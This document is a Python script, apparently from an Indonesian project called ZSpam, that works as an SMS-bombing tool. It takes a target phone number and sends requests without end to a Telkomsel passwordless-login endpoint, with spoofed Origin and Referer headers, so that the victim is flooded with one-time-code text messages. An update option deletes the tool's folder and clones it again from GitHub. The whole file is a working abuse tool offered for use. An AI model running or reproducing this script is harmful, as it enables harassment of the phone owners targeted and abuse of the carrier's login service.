#!/usr/bin/env python3
# Coded : Zettamus © 2019
# Contact me on WA : 081242873775
# Contact me on Telegram : t.me/zettamus
# Codenya berantakan :v
# RECODE? Silahkan, but jgn hapus nama author di atas_-
# Version : 1.0

# Import Module :
import requests,time,os
now=time.strftime
Y = '\033[93m'
G = '\x1b[32m'
R = '\033[31;1m'
r = "\033[0m"
C = '\033[1;36m'
print(r)
os.system('clear')

# Checking Update
try:
    versi='1.1'
    requp=requests.get('https://raw.githubusercontent.com/zettamus/ZSpam/master/README.md').text
    if versi in str(requp):
        up=r+r+'['+G+'INFO'+r+'] Type ['+G+'99'+r+'] to update '
        update= r+'['+C+now("%X")+r+'] Updating Z Spam tools...'
        ver=r+'['+G+'INFO'+r+'] New version is available. Update now'
except: pass


# BANNER
print("""



        {} _______{}      _______         TELKOMNYET
        {}|   _   |{}    |   _   | .-----. .---.-. .--------.
        {}|___|   |{}    |   1___| |  _  | |  _  | |        |
         {}/  ___/{}     |____   | |   __| |___._| |__|__|__|
        {}|:  1  \{}     |:  1   | |__| {}Created {}:{} Zettamus
        {}|::.. . |{}    |::.. . |      {}Version {}:{} 1.0
        {}`-------'{}    `-------'
      +____________________________________________________+
        """.format(R,r,R,r,R,r,R,r,R,r,G,r,G,R,r,G,r,G,R,r))


# MAIN
try:
    print(ver)
    print(up)
except: pass
print( r+'['+G+'INFO'+r+'] Type "'+G+'?'+r+'" to required ')
no=input(r+"["+G+now('%X')+r+"] No target : "+G)
if no =='':
    exit(r+"["+R+now('%X')+r+"] Don't be Empty..!")
elif no == '?':
    print(r+'['+G+'INFO'+r+'] Bekerja pada nomor yang belum terdaftar pada App my telkomsel..')
    exit(r+'['+G+'INFO'+r+'] This tools created by '+G+'Zettamus ')
elif no =='99':
    try:
        print(update)
        print(r+'['+C+'*'+r+'] Please Wait..')
        os.system('cd ..;rm -rf ZSpam')
        os.system('cd ..;git clone https://github.com/zettamus/ZSpam > /dev/null 2>&1')
        exit(r+"["+R+now('%X')+r+"] Update Succesfully..")
    except:
        exit(r+"["+R+now('%X')+r+"] Your tools is the latest version")
elif len(no) < 10:
    exit(r+"["+R+now('%X')+r+"] Number invalid")
header = {'Origin':'https://my.telkomsel.com',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept':'application/json, text/javascripte',
        'Referer':'https://my.telkomsel.com/',
        'Connection':'keep-alive'}
dat={'phone_number':'+'+no,'connection':'sms'}


# PENGULANGAN
count=0
while True:
    time.sleep(1)
    try:
        c=requests.post("https://tdwidm.telkomsel.com/passwordless/start",data=dat,headers=header).text
        if "false" in c:
            count+=1
            print(r+'\n['+G+now("%X")+r+'] Success cuk...['+G+str(count)+r+']')
        elif 'Too Many Requests' in c:
            print(r+'\r['+Y+now("%X")+r+'] Please wait..!!',end='')
        else:
            print(r+'\n['+G+now("%X")+r+'] Failed :(')
    except KeyboardInterrupt:
        exit(r+'\n['+R+now("%X")+r+'] Exit : Ok!')
    except requests.ConnectionError:
        exit(r+'\n['+R+now("%X")+r+'] Check your connection')
    except Exception as f:
        exit(r+'\n['+R+now("%X")+r+'] '+str(f))

